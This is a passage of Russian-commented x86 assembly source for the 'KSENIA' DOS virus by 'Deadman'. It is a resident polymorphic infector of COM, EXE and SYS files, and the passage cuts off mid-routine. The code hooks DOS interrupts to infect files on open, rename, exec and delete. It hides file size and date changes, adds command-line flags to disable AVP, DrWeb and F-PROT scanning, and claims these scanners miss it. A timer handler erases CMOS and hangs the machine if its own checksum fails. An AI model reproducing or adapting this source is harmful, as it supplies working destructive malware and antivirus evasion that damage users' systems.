        db      0ah-2                     ; "reg" bit ptr (FF if none)
 total  equ     ($-opcz)/(op2n-opcz)

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; конец подсчета CRC
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 end_crc:

 random1                dw      0         ; пара случайных чисел
 random2                dw      0
 checksum               dd      0f90738adh; CRC32 вируса

 epb                    dw      0         ; Execute Parameter Block
                        dw      80h       ; командная строка
 seg0                   dw      0
                        dw      5ch       ; FCB#1
 seg1                   dw      0
                        dw      6ch       ; FCB#2
 seg2                   dw      0
 original               db      0c3h,31 dup (0)

 nex_ptr                dw      0         ; указатель на расшифровщик
 signature              db      ssize dup (0)

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; область недисковых данных - конец файловой части вируса
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 eov:

 io08                   dw      ?,?       ; ячейки хранения векторов
 io21p                  dw      ?,?       ; прерываний
 io24                   dw      ?,?
 stf                    db      ?         ; режим стелс (mcbcheck)
 command                db      ?         ; command.com (mcbcheck)
 seek_pos               dw      ?,?       ; позиция указателя (SeekSave)
 nrbytes                dw      ?         ; прочитанные байты (ReadStealth)
 rm_field               db      ?         ; хранение R/M поля индекса (NEXUS)
 r_used                 db      ?,?       ; 2 используемых регистра (NEXUS)
 offs_ptr               dw      ?         ; (NEXUS)
 cr_ptr                 dw      ?         ; (NEXUS)
 wflag                  dw      ?         ; флаг W опкода (NEXUS)
 do_enc                 db      ?,?,?,?   ; опкод-буфер (NEXUS/CRLOAD)
 fn_ptr                 dw      ?,?       ; имя файла (ClrAttrib)
 attrib                 dw      ?         ; аттрибуты (ClrAttrib)
 time                   dw      ?         ; время файла (GetDate)
 date                   dw      ?         ; дата файла (GetDate)
 delta                  dw      ?         ; +смещение (входной параметр NEXUS)
 w95state               dw      ?         ; состояние Win95 (точнее WinOldAp)
 save_ax                dw      ?         ; передача параметров менеджера
 save_bx                dw      ?         ; резидентной части обработчикам
 save_es                dw      ?         ;
 delay                  db      ?         ; счетчик для Virus Guard

 header                 db      32 dup (?)
 buffer                 db      vsize dup (?)
 stacks                 db      100h dup (?)

 eom:                   end     ksenia
───────────────────────────────────────────────────────────────[KSENIA.ASM]───
───────────────────────────────────────────────────────────────[KSENIA.ASM]───
 comment ъ

                KSENIA Virus Version 1.1 Copyright (C) Deadman
              └────────────────────────────────────────────────┘

 TSR/COM/EXE/SYS fast polymorphic infector
  Infects on 1857h/3Dh/41h/43h/4Bh/56h/6Ch/7141h/7143h/7156h/716Ch/71A9h
     (Internal/Open/Del/Chmod/Exec/Ren/ExtOpen/LFNs/LFN Server Open)
  Size/Date stealth on 11h/12h/4Eh/4Fh/5700h/5701h/714Eh/714Fh/71A6h
     (Find First/Next FCB/DTA/LFN + Get/Set File Time/Date + Get Handle Info)
  Redirection stealth on 3Fh/42h (Read/LSeek)
  SFT stealth without using any SFT values (for Novell/Win95 compatibility)
  Disinfects the host on 40h (Write)
  Re-Hooks Int 21h vector after Win95 installation. Works perfectly!
  Re-Hooks Int 21h vector if virus handler has been removed from the chain
  Uses the most safe method of infecting .SYS files for resident virus
  Every second it calcucates CRC32 and erases CMOS if the CRC is incorrect
  Virus stays resident in low memory, executing the host with 4B00h function
  When some of AVs are executing, virus adds some parameters to cmdline
  Polymorphic in files uses its internal polymorphic engine
  Engine uses table-based instructions as a random size garbage (85% of 8086)
  Engine uses different count and index registers
  Generates different decryptors (ADD/SUB/XOR/NOT/NEG/ROR/ROL/INC/DEC imm8)
  Has a second internal shield (secondary encrypts itself with a kewl method)
  Will not infect files with a current hour stamp
  Will not infect ADINF/COMMAND files
  Disable stealth if PkZip/RAR/ARJ/LHA/ARC/DEFRAG/SPEEDISK/CHKDSK/ScanDisk/NDD/ADINF are running
  Intercepts Int 24h to disallow user be warned by a critial error message
  Virus was analysed by these AVs
      F-PROT 3.05b - No detection or warns
      AVP 3.0.Plat - No detection or warns
      DRWEB 4.11   - No detection or warns

                                 Deadman from hell. E-Mail: dman@mail.ru ъ

 vsize  equ     eov-ksenia      ; дисковая память для вируса
 msize  equ     eom-ksenia      ; размер памяти требуемой вирусу
 v_id   equ     0b52dh          ; метка вируса (HEADER+12h)
 crlen  equ     100h            ; размер полиморфного расшифровщика

 b      equ     <byte ptr>      ; некоторые сокращения
 w      equ     <word ptr>
 d      equ     <dword ptr>
 o      equ     <offset>

 mvs    macro   Dest,Sour       ; макрос для пересылки данных
        push    Sour            ; через стек
        pop     Dest
        endm

        model   tiny            ; ШАПКА
        codeseg
        p386
        org     100h
 ksenia:
        xor     bp,bp           ; нужно для 1-го запуска вируса
        call    crc             ; подсчет CRC вируса
        mov     checksum,eax
        call    SaveRegs        ; сохранение входных регистров
        jmp     shield          ; эти CRLEN байт зарезервированы в теле
        org     ksenia+crlen    ; вируса для полиморфного дешифратора

        push    3202h           ; восстановление флагов
        popf
        call    SaveRegs        ; сохранение входных регистров

        mov     ah,30h          ; запрос версии DOS
        int     21h             ; применяется для вычисления
 ip:    mov     bp,sp           ; экстра смещения в зараженном файле
        mov     bp,[bp-6]       ; сохраненное IP командой INT и
        sub     bp,offset ip    ; вычисляем разность смещений (delta)

        push    ds              ; этот кусок кода не даст эмулятору
        mvs     ds,0ffffh       ; расшифровать вирус
        mov     si,07h          ; FFFF:0005 содержит дату, из которой мы
        mov     dx,2eh          ; хватаем символ "/", и с помощью XOR
        xor     dl,[si]         ; получаем единицу
        pop     ds

        lea     si,endi-1+bp    ; второе (внутреннее) кольцо защиты вируса
        mov     cx,endi-shield-1
 turbo: mov     al,cs:[si]      ; краткая структура:
        add     cs:[si-1],al    ; ДО:    byte1 byte2 byte3 byte4
        sub     si,dx           ; ПОСЛЕ: b1+b2 b2+b3 b3+b4 b4+b5
        loop    turbo
 shield:
        cmp     cs:host+bp,"S"  ; проверка хоста на системный
        jz      strategy        ; драйвер

        mov     ax,1856h        ; проверка на присутствие вируса в памяти
        int     21h             ; AH=18 - пустая функция
        cmp     ax,3265h        ; AX=3265 - значит, что копия вируса уже в
        jne     exeinstall      ; памяти

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Возвращение управления программе
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 complete:
        lea     si,original+bp  ; si-сохраненное начало хоста
        mov     al,cs:host+bp   ; загрузка кода типа хоста
        cmp     al,"S"          ; системный драйвер?
        jz      run_sys
        cmp     al,"E"          ; исполняемый файл?
        jz      run_exe

        mov     di,100h         ; тип зараженной программы: COM
        push    di              ; сохранение в стеке адреса возврата
        mov     cx,32           ; восстановление в памяти оригинального
        rep     movsb           ; заголовка программы
        jmp     LoadRegs        ; передача управления в начало программы

 run_sys:
        mov     ax,cs:[si+12h]  ; восстановление метки вируса
        mov     cs:[12h],ax     ; восстановление смещения процедуры
        mov     ax,cs:[si+06h]  ; обработки стратегии
        mov     cs:[06h],ax     ;
        push    ax              ; сохранение смещения в стеке
        jmp     LoadRegs        ; восстановление регистров

 run_exe:
        mov     ax,es
        add     ax,010h
        add     cs:[si+16h],ax  ; .reloc
        add     cs:[si+0eh],ax  ; .reloc
        mov     bp,sp
        mov     [bp.rbx],si     ; сохранение указателя на заголовок
        call    LoadRegs        ; восстановление регистров
        mov     ss,cs:[bx+0eh]  ; установка стекового сегмента
        mov     sp,cs:[bx+10h]  ; установка указателя стека
        jmp     d cs:[bx+14h]   ; передача управления

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Инсталляция вируса в память из командного файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 exeinstall:
        mov     di,100h         ; ES:DI = PSP:0100
        mvs     ds,cs           ; DS:SI = код вируса
        lea     si,ksenia+bp    ; копируем код вируса поверх зараженной
        mov     cx,msize        ; программы сразу после PSP
        db      6ah,00h         ; загружаем в стек команды для
        db      66h,68h         ; копирования вируса
        db      0f3h,0a4h,0cah,6
        push    es offset done  ; rep movsb / retn 06
        mov     ax,sp
        add     ax,4
        jmp     far ptr ax

 done:  mov     ax,cs           ; мы на новом месте, с правильным
        mov     ds,ax           ; смещением, как при компиляции
        mov     seg0,ax         ; заполнение сегментных полей в EPB
        mov     seg1,ax
        mov     seg2,ax

        call    VectMan         ; загрузка и перехват векторов прерываний
        call    FixVirus        ; заражение некоторых важных файлов

        mov     ah,4ah          ; уменьшить до нужного размера блок
        mov     bx,(msize+100h)/16+2 ; памяти, выделенный программе
        mvs     es,cs
        int     21h

        mov     si,2ch          ; PSP:2Ch = сегмент окружения
        mov     ds,[si]         ; поместить его в DS
        xor     ax,ax
        mov     si,-1

 escan: inc     si              ; сканним пока не найдем DW 0
        cmp     W [si],ax       ; за ним следует имя файла (программы),
        jne     escan           ; из которой был запушен вирус
        lea     dx,[si+4]       ; dx -> имя

        mov     ax,cs           ; проинициализируем стековые указатели
        mov     ss,ax           ; а то они болтаются где-то внизу //
        lea     sp,stacks+size stacks

        mov     ax,4b00h        ; запускаем носителя
        lea     bx,epb          ; ES:BX = EPB
        int     21h

        mov     si,2ch
        mov     es,cs:[si]      ; получение сегмента окружения
        mov     ah,49h          ; освобождение блока памяти
        int     21h

        mov     ax,cs           ; маскируем наш блок памяти так, как будто
        dec     ax              ; он содержит только наш PSP. А под себя
        mov     ds,ax           ; построим другой блок памяти, следующий
        xor     si,si           ; прямо за PSP. При завершении программы
        mov     al,4dh          ; наш блок памяти не будет освобожен.
        xchg    B [si],al
        mov     W [si+3],0fh    ; Память под MCB нам любезно предоставлена
        mov     B [si+100h],al  ; командной строкой (PSP+0F0h)
        mov     W [si+101h],8   ;
        mov     W [si+103h],msize/16+2

        mov     ah,4dh          ; AH=4Dh (WAIT)
        int     21h             ; получить ErrorLevel запущенной программы
        mov     ah,4ch          ; AH=4Ch (EXIT)
        int     21h             ; выйти в DOS без всяких подозрений

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Инсталляция вируса в память из .SYS файла
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 Strategy:
        mvs     ds,cs           ; инициализация сегментного регистра
        mov     si,sp           ; загрузка указателей на блок
        mov     bx,ss:[si.rbx]  ; запроса из стека
        mov     es,ss:[si.res]  ;
        lea     si,reqhdr+bp
        mov     [si],bx         ; сохранение указателей в ячейках
        mov     [si+2],es       ; памяти в теле вируса
        jmp     complete        ; передача управления драйверу

 Interrupt:
        call    SaveRegs        ; сохранение регистров

        mov     ah,30h          ; запрос версии DOS
        int     21h             ; применяется для вычисления
 ipX:   mov     bp,sp           ; экстра смещения в зараженном файле
        mov     bp,[bp-6]       ; сохраненное IP командой INT и
        sub     bp,offset ipX   ; вычисляем разность смещений (delta)

        mvs     ds,cs           ; инициализация DS
        lea     si,original+bp  ; указатель на оригинальное
        lea     di,intcall+bp   ; начало драйвера
        mov     ax,[si+08]      ; загрузка смещения процедуры
        mov     ds:[08],ax      ; прерывания сохранение смещения
        mov     [di],ax         ; ячейка с адресом процедуры прерывания
        mov     [di+02],cs      ; драйвера

        lea     bx,reqhdr+bp    ; указателя на адрес заголовка запроса
        les     bx,[bx]         ; загрузка адреса заголовка запроса
        mov     ax,es:[bx.0eh]  ; смещение конца памяти, доступной драйверу
        shr     ax,4            ; получение сегментной состовляющей смещения
        add     ax,es:[bx.10h]  ; добавление сегмента конца памяти
        sub     ax,msize/10h+2  ; уменьшение доступной драйверу памяти
        mov     w es:[bx.0eh],0 ; смещение последего доступного байта
        mov     es:[bx.10h],ax  ; сегмент последего доступного байта
        sub     ax,10h          ; AX - сегмент вируса
        mov     es,ax           ; сохранение сегмента
        mov     di,100h         ; перегон вируса в кусок
        lea     si,[di+bp]      ; откушенной у драйвера памяти
        mov     cx,msize
        cld
        rep     movsb

        push    es o tmps       ; передача управления в новый сегмент
        retf
 tmps:  call    LoadRegs        ; восстановление регистров

        call    d cs:intcall    ; вызов драйвера (функция 00: инициализация)

        call    SaveRegs        ; сохранение регистров
        mov     ax,1856h        ; проверка на присутствие вируса в памяти
        int     21h             ; AH=18 - пустая функция
        cmp     ax,3265h        ; AX=3265 - значит, что копия вируса уже в
        jz      sfars           ; памяти

        mvs     ds,cs           ; инициализация сегментного регистра
        les     bx,d reqhdr     ; буфер запроса
        mov     ax,es:[bx.0eh]  ; смещение конца памяти, доступной драйверу
        shr     ax,4            ; получение сегментной состовляющей смещения
        add     ax,es:[bx.10h]  ; добавление сегмента конца памяти
        cmp     ax,intcall+2    ; сегмент драйвера
        jz      sfars           ; нерезидентный драйвер?

        inc     ax              ; + 1 параграф
        push    ax              ; граница
        add     ax,msize/10h+2  ; увеличение границ памяти
        mov     w es:[bx.0eh],0 ; смещение последего доступного байта
        mov     es:[bx.10h],ax  ; сегмент последего доступного байта
        pop     ax              ; уже не граница

        sub     ax,10h          ; AX - сегмент вируса
        mov     es,ax           ; сохранение сегмента
        mov     di,100h
        mov     si,di
        mov     cx,msize        ; копирование тела вируса из
        cld                     ; временного сегмента в окончательный
        rep     movsb

        push    es offset owns  ; передача управления в окончательный
        retf                    ; сегмент вируса после драйвера
 owns:  call    VectMan         ; загрузка и перехват векторов прерываний

 sfars: call    LoadRegs        ; загрузка регистров
        retf

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Область данных
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒

 copyright    db      'Ksenia.'
              db      vsize/1000 mod 10+'0'
              db      vsize/100  mod 10+'0'
              db      vsize/10   mod 10+'0'
              db      vsize      mod 10+'0'
              db      ' Version 1.1 Copyright (C) ',??date,' by Deadman',0

 extens       db      '.com',0  ; расширения файлов, которые мы
              db      '.exe',0  ; инфицируем
              db      '.sys',0
              db      0

 prms         db      'AVPDOS32',0,0,' /M'    ,0dh
              db      'DRWEB'   ,0,0,' /NM'   ,0dh
              db      'F-PROT'  ,0,0,' /NOMEM',0dh
              db      0

 AVs          db      'ADINF',0   ; их вирус трогать не будет
              db      'COMMAND',0
              db      0

 windows      db      'WiNBooTDiR=',0
              db      0

 files        db      '\SYSTEM\CONAGENT.EXE',0
              db      '\COMMAND\MODE.COM',0
              db      '\COMMAND\ANSI.SYS',0
              db      '\HIMEM.SYS',0
              db      '\WIN.COM',0
              db      0

 stlock       db      'PKZIP',0 ; программы, во время работы которых
              db      'RAR',0   ; отключаются стелс-функции вируса
              db      'ARJ',0
              db      'LHA',0
              db      'ARC',0
              db      'UUENCODE',0
              db      'DEFRAG',0
              db      'SPEEDISK',0
              db      'SCANDISK',0
              db      'CHKDSK',0
              db      'NDD',0
              db      'ADINF',0
              db      0

 funcs        dw      1856h,tsrtest     ; проверка зараженности памяти (NULL)
              dw      4AFFh,rehook      ; re-перехват вектора (SETBLOCK)

              dw      3DFFh,infect      ; заражение (OPEN)
              dw      1857h,infect      ; заражение (VIXFIRUS)
              dw      41FFh,infect      ; заражение (DEL)
              dw      43FFh,infect      ; заражение (CHMOD)
              dw      4BFFh,infect      ; заражение (EXEC)
              dw      56FFh,infect      ; заражение (REN)
              dw      6C00h,extinfect   ; заражение (EXTOPEN)
              dw      7141h,infect      ; заражение (LFN DEL)
              dw      7143h,infect      ; заражение (LFN CHMOD)
              dw      7156h,infect      ; заражение (LFN REN)
              dw      716Ch,extinfect   ; заражение (LFN OPEN)
              dw      71A9h,extinfect   ; заражение (LFN SERVER OPEN)

              dw      11FFh,fcbstealth  ; стелс (FCB)
              dw      12FFh,fcbstealth  ; стелс (FCB)
              dw      4EFFh,dtastealth  ; стелс (DTA)
              dw      4FFFh,dtastealth  ; стелс (DTA)
              dw      714Eh,lfnstealth  ; стелс (LFN)
              dw      714Fh,lfnstealth  ; стелс (LFN)
              dw      71A6h,infstealth  ; стелс (LFN HANDLE INFO)
              dw      5700h,date_get    ; стелс (GET DATE)
              dw      5701h,date_set    ; стелс (SET DATE)
              dw      42FFh,seekstealth ; стелс (LSEEK)
              dw      3FFFh,readstealth ; стелс (READ)
              dw      40FFh,diswrite    ; стелс (WRITE)

              dw      3EFFh,patchsft    ; корректировка SFT
              dw      44FFh,patchsft    ; корректировка SFT
              dw      45FFh,patchsft    ; корректировка SFT
              dw      46FFh,patchsft    ; корректировка SFT
              dw      68FFh,patchsft    ; корректировка SFT
              dw      0


▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 08 (Virus Guard)
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 vguard:
        call    SaveRegs        ; сохранение регистров
        inc     cs:delay        ; проверка будет происходить примерно
        cmp     cs:delay,18     ; каждую секунду
        jb      exit_guard
        mov     cs:delay,0
        call    crc             ; подсчет CRC теля вируса
        cmp     cs:checksum,eax ; сравнение ее с эталонной
        jz      crc_ok

        mov     ax,1681h        ; объявление начала DOS Critical Session
        int     2fh             ;
        mov     al,0ffh         ; контроллер прерываний:
        out     21h,al          ; запрещение всех аппаратных прерываний

        mov     cx,40h          ; затираем данные CMOS
 cmos:  mov     ax,cx
        out     71h,al
        out     70h,al
        loop    cmos
        jmp     $               ; весим машину

 crc_ok:
        mov     ax,1856h        ; проверяем, никто ли не выкидывал наш
        int     21h             ; обработчик 21-го прерывания из общей
        cmp     ax,3265h        ; цепи?
        je      exit_guard

        mov     ax,3521h        ; запрос вектора int 21h
        int     21h
        call    set_dup         ; установить 21-й вектор прерывания на другой
        lea     dx,manager      ; здесь нужно переустановить вектор
        call    chk_dup         ; находим место, куда указывал вектор
        jnz     reset           ; в последние годы своей жизни
        lea     dx,handler
 reset: mov     ax,2521h        ; переустанавливаем вектор
        mvs     ds,cs
        int     21h

 exit_guard:
        call    LoadRegs
        jmp     d cs:io08

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Обработчик прерывания 21
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 handler:
        call    chk_dup         ; проверка, не переустановили ли вектор
        jz      manager         ; это бывает после загрузки Win95
        jmp     D cs:io21p      ; иначе мы тут ни при чем

 manager:
        call    SaveRegs        ; сохранить все регистры

        mov     cs:save_ax,ax   ; соохранение параметров
        mov     cs:save_bx,bx   ; будут использоваться (Filename), если
        mov     cs:save_es,es   ; функция = 4b00 и заппускаемый файл - AV

        lea     si,funcs        ; есть табличка, по которой обрабатываются
 fscan: cmp     ah,cs:[si+1]    ; нужные функции int 21 (dw F#, dw offset)
        jne     lnext           ; сравниваем al с текущей ячейкой таблицы
        cmp     B cs:[si],0ffh  ; проверка на ненужность проверки подфункции
        je      ljump
        cmp     B cs:[si],al    ; проверка подфункции
        jne     lnext

 ljump: call    mcbcheck        ; функция найдена: проверка MCB (для stealth)
        push    W cs:[si+2]     ; берем смещение обработчика для функции
        jmp     LoadRegs        ; восстанавливаем регистры

 lnext: add     si,4            ; берем следующую запись из таблицы
        cmp     w cs:[si],0     ; проверка конца таблицы
        jnz     fscan
        call    LoadRegs        ; обработчик для этой функции так и не
        jmp     ExitHandler     ; найден: отдаем управление

 exithandler:
        push    ax ax es bx bp  ; сохранение ES:BX и резервирование места
        call    get_dup         ; получение оригинального вектора int 21h
        mov     bp,sp
        mov     [bp+6],bx       ; занос вектора в две свободные ячейки
        mov     [bp+8],es       ; в стеке
        pop     bp bx es        ; восстановление регистров ES:BX
        retf                    ; передача управления DOS

 ireturn:
        retf    2               ; возврат с уничтожением флагов в стеке

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Заражение файлов
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 extinfect:
        call    SaveRegs        ; сохранить в стеке регистры
        mov     dx,si
        jmp     InfA
 infect:
        call    SaveRegs        ; сохранить в стеке регистры
 InfA:  call    Hook24          ; установка 24-го вектора прерывания
        call    Filename        ; проверка имени и расширения файла
        jc      noinf
        call    ClearFileAttributesA
        jc      noinf
        call    CreateFileA     ; открытие файла для R/W
        jc      RAttr
        call    Infect_Handle   ; инфицирование handle
        call    CloseFile       ; закрытие файла
 Rattr: call    RestoreFileAttributesA
 Noinf: call    Remove24        ; восстановление обработчика int 24h
        call    LoadRegs        ; восстановление регистров

        cmp     ah,3dh          ; проверка на функцию открытия файла
        je      sftstealth      ; в случае открытия инфицированного файла
        cmp     ax,6c00h        ; нам понадобится уменьшить его длину
        je      sftstealth      ; в SFT и откорректировать его дату
        cmp     ax,716ch        ;
        je      sftstealth      ;
        cmp     ax,71A9h        ;
        je      sftstealth      ;
        jmp     exithandler     ;

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; SFT stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 sftstealth:
        call    int21           ; открыть нужный файл
        call    SaveRegs        ; сохранение регистров
        jc      no_sft
        xchg    ax,bx
        call    CloseSFT        ; закрыть SFT
 no_sft:
        call    LoadRegs
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; FCB stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 fcbstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        cmp     al,0ffh         ; найдено что-нибудь?
        jz      no_fcb
        cmp     cs:stf,0        ; работать можно?
        jnz     no_fcb

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        cmp     b es:[bx],0ffh  ; расширенное FCB?
        jne     usual
        add     bx,7
 usual: lea     si,[bx+19h]     ; si -> дата файла
        lea     di,[bx+1dh]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_fcb:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; DTA stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 dtastealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_dta          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_dta

        mov     ah,2fh          ; запрос адреса DTA
        call    int21
        lea     si,[bx+18h]     ; si -> дата файла
        lea     di,[bx+1ah]     ; di -> длина файла
        call    sizst           ; скрытие лишних байт
 no_dta:
        call    LoadRegs        ; восстановление регистров
        jmp     ireturn

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
; Win95 stealth
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 infstealth:
        stc                     ; CF должен быть установлен
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; все ok?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,0            ; время в Win95 формате
        mov     si,dx
        lea     di,[si+24h]     ; размер файла
        lea     si,[si+14h]     ; дата файла
        mvs     es,ds
        jmp     allw95

 lfnstealth:
        call    int21           ; вызвать функцию DOS
        call    SaveRegs        ; сохранение регистров
        jc      no_win          ; нашли?
        cmp     cs:stf,0        ; работать можно?
        jnz     no_win
        mov     ax,si           ; формат времени
        lea     si,[di+14h]     ; дата файла
        lea     di,[di+20h]     ; размер файла

 allw95:
        cmp     ax,1            ; проверка формата времени
        jz      dos_date

        push    si di ax        ; сохранение параметров на будующее
        mov     ax,71a7h        ; перевод времени из формата
        mov     bl,0            ; Win95 в формат DOS
        mvs     ds,es           ; SI указывает на дату
        call    int21           ; сейчас CX:DX содержат обычное DOS время
        pop     ax di si        ; восстановление параметров
